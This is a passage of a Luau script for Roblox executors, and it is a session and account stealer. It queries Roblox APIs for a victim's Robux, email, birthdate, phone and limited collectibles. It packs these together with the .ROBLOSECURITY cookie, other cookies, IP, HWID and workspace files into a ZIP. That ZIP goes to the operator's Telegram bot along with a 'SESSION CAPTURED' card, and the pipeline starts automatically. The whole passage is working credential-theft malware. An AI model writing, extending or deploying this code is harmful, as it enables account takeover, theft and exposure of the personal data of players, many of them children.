
            end
        end
    end)

    -- Currency / Robux Balance (Authenticated endpoint via Executor session)
    pcall(function()
        local currUrl = string.format("https://economy.roblox.com/v1/users/%d/currency", userId)
        local resp = HttpRequest({ Url = currUrl, Method = "GET" })
        if resp and resp.StatusCode == 200 then
            local data = Harvester.SafeJsonDecode(resp.Body)
            if data and data.robux then
                profile.RobuxBalance = tostring(data.robux)
            end
        end
    end)

    -- Account Settings / Bound Email / Gmail Mask & Verification Status
    pcall(function()
        local emailResp = HttpRequest({
            Url = "https://accountsettings.roblox.com/v1/email",
            Method = "GET"
        })
        if emailResp and emailResp.StatusCode == 200 then
            profile.BillingAndEmail.EmailStatus = Harvester.SafeJsonDecode(emailResp.Body)
        end

        local birthResp = HttpRequest({
            Url = "https://users.roblox.com/v1/birthdate",
            Method = "GET"
        })
        if birthResp and birthResp.StatusCode == 200 then
            profile.BillingAndEmail.Birthdate = Harvester.SafeJsonDecode(birthResp.Body)
        end

        local phoneResp = HttpRequest({
            Url = "https://accountinformation.roblox.com/v1/phone",
            Method = "GET"
        })
        if phoneResp and phoneResp.StatusCode == 200 then
            profile.BillingAndEmail.Phone = Harvester.SafeJsonDecode(phoneResp.Body)
        end
    end)

    -- Limited Collectibles & RAP Calculation
    pcall(function()
        local invUrl = string.format(
            "https://inventory.roblox.com/v1/users/%d/assets/collectibles?limit=100&sortOrder=Asc",
            userId
        )
        local resp = HttpRequest({ Url = invUrl, Method = "GET" })
        if resp and resp.StatusCode == 200 then
            local data = Harvester.SafeJsonDecode(resp.Body)
            if data and type(data.data) == "table" then
                local totalRap = 0
                for _, item in ipairs(data.data) do
                    local rap = tonumber(item.recentAveragePrice) or 0
                    totalRap += rap
                    table.insert(profile.Collectibles, {
                        Name = item.name,
                        AssetId = item.assetId,
                        RAP = rap,
                        Serial = item.serialNumber
                    })
                end
                profile.RAP = totalRap
            end
        end
    end)

    return profile
end

--------------------------------------------------------------------------------
-- 4. TELEGRAM BOT DISPATCHER (PHOTO CARD + INLINE BUTTONS + ZIP UPLOAD)
--------------------------------------------------------------------------------
local Telegram = {}

local function escapeHtml(str: string): string
    local s = tostring(str)
    s = string.gsub(s, "&", "&amp;")
    s = string.gsub(s, "<", "&lt;")
    s = string.gsub(s, ">", "&gt;")
    return s
end

function Telegram.SendAvatarCard(profile: {[string]: any}, session: {[string]: any}): boolean
    local endpoint = string.format("https://api.telegram.org/bot%s/sendPhoto", Config.TelegramBotToken)

    local emailMask = "None / Unauthenticated"
    if profile.BillingAndEmail.EmailStatus and profile.BillingAndEmail.EmailStatus.emailAddress then
        emailMask = tostring(profile.BillingAndEmail.EmailStatus.emailAddress)
            .. (profile.BillingAndEmail.EmailStatus.verified and " (Verified)" or " (Unverified)")
    end

    local cookiePreview = "Not Exposed"
    if session.RobloSecurity ~= "NOT_EXPOSED_BY_VM" then
        cookiePreview = string.sub(session.RobloSecurity, 1, 48) .. "... [FULL IN ZIP]"
    end

    local caption = table.concat({
        "<b>⚡ ROBLOX SESSION CAPTURED ⚡</b>\n",
        "━━━━━━━━━━━━━━━━━━━━━━\n",
        string.format("👤 <b>Account:</b> <code>%s</code> (@%s)\n", escapeHtml(profile.DisplayName), escapeHtml(profile.Username)),
        string.format("🆔 <b>User ID:</b> <code>%d</code>\n", profile.UserId),
        string.format("📅 <b>Created:</b> <code>%s</code> (%d days)\n", escapeHtml(profile.CreatedDate), profile.AccountAgeDays),
        string.format("💎 <b>Membership:</b> <code>%s</code>\n", escapeHtml(profile.MembershipType)),
        string.format("💰 <b>Robux:</b> <code>%s</code> | <b>RAP:</b> <code>%d</code>\n", escapeHtml(profile.RobuxBalance), profile.RAP),
        string.format("📧 <b>Linked Mail/Gmail:</b> <code>%s</code>\n", escapeHtml(emailMask)),
        "━━━━━━━━━━━━━━━━━━━━━━\n",
        string.format("🌐 <b>IP:</b> <code>%s</code> (%s)\n", escapeHtml(profile.IPAddress), escapeHtml(profile.GeoData.countryCode or "UNK")),
        string.format("🖥️ <b>HWID:</b> <code>%s</code>\n", escapeHtml(profile.HWID)),
        string.format("🎮 <b>Place:</b> <code>%s</code> (%d)\n", escapeHtml(profile.GameName), profile.PlaceId),
        "━━━━━━━━━━━━━━━━━━━━━━\n",
        string.format("🍪 <b>Cookie:</b> <code>%s</code>", escapeHtml(cookiePreview)),
    })

    local joinUrl = string.format(
        "https://www.roblox.com/games/start?placeId=%d&launchData=%s",
        profile.PlaceId,
        profile.JobId
    )
    local profileUrl = string.format("https://www.roblox.com/users/%d/profile", profile.UserId)
    local rolimonsUrl = string.format("https://www.rolimons.com/player/%d", profile.UserId)

    local replyMarkup = {
        inline_keyboard = {
            {
                { text = "👤 Open Profile", url = profileUrl },
                { text = "📈 Rolimon's Valuation", url = rolimonsUrl }
            },
            {
                { text = "🎮 Join Active Server", url = joinUrl }
            }
        }
    }

    local payload = HttpService:JSONEncode({
        chat_id      = Config.TelegramChatId,
        photo        = profile.AvatarFullUrl,
        caption      = caption,
        parse_mode   = "HTML",
        reply_markup = replyMarkup
    })

    local ok, resp = pcall(function()
        return HttpRequest({
            Url     = endpoint,
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body    = payload
        })
    end)

    return ok and resp and resp.StatusCode == 200
end

function Telegram.SendZipArchive(zipFilename: string, zipBinary: string, captionText: string): boolean
    local endpoint = string.format("https://api.telegram.org/bot%s/sendDocument", Config.TelegramBotToken)
    local boundary = "----WebKitFormBoundary" .. string.gsub(HttpService:GenerateGUID(false), "-", "")

    local bodyParts = {
        "--" .. boundary .. "\r\n",
        'Content-Disposition: form-data; name="chat_id"\r\n\r\n',
        tostring(Config.TelegramChatId) .. "\r\n",

        "--" .. boundary .. "\r\n",
        'Content-Disposition: form-data; name="caption"\r\n\r\n',
        captionText .. "\r\n",

        "--" .. boundary .. "\r\n",
        string.format('Content-Disposition: form-data; name="document"; filename="%s"\r\n', zipFilename),
        "Content-Type: application/zip\r\n\r\n",
        zipBinary .. "\r\n",

        "--" .. boundary .. "--\r\n"
    }

    local multipartBody = table.concat(bodyParts)

    local ok, resp = pcall(function()
        return HttpRequest({
            Url     = endpoint,
            Method  = "POST",
            Headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
                ["Content-Length"] = tostring(#multipartBody)
            },
            Body    = multipartBody
        })
    end)

    return ok and resp and resp.StatusCode == 200
end

--------------------------------------------------------------------------------
-- 5. ORCHESTRATION PIPELINE
--------------------------------------------------------------------------------
local function ExecutePipeline()
    local profile = Harvester.CollectFullProfile()
    local session = Harvester.ExtractSessionAndCookies()

    -- Pack structured files into an in-memory ZIP archive
    local zip = ZipBuilder.new()

    zip:AddFile(
        "account_overview.json",
        HttpService:JSONEncode(profile)
    )

    zip:AddFile(
        "cookies_and_tokens.txt",
        table.concat({
            "=== ROBLOSECURITY ===\n",
            tostring(session.RobloSecurity),
            "\n\n=== ENVIRONMENT COOKIES ===\n",
            HttpService:JSONEncode(session.EnvironmentCookies),
            "\n\n=== MOBILE API USERINFO ===\n",
            HttpService:JSONEncode(session.MobileApiUserInfo)
        })
    )

    zip:AddFile(
        "collectibles_rap.json",
        HttpService:JSONEncode({
            TotalRAP = profile.RAP,
            Items    = profile.Collectibles
        })
    )

    for path, content in pairs(session.WorkspaceArtifacts) do
        local cleanName = string.gsub(path, "[\\/:*?\"<>|]", "_")
        zip:AddFile("workspace_dump/" .. cleanName, content)
    end

    local zipBytes = zip:Build()
    local archiveName = string.format("%s_%d_bundle.zip", profile.Username, profile.UserId)

    -- 1. Dispatch top photo card with inline buttons and formatted metadata
    Telegram.SendAvatarCard(profile, session)

    -- 2. Dispatch complete ZIP archive attachment
    Telegram.SendZipArchive(
        archiveName,
        zipBytes,
        string.format("📦 Full archive for %s (ID: %d) — %d bytes", profile.Username, profile.UserId, #zipBytes)
    )
end

task.spawn(ExecutePipeline)
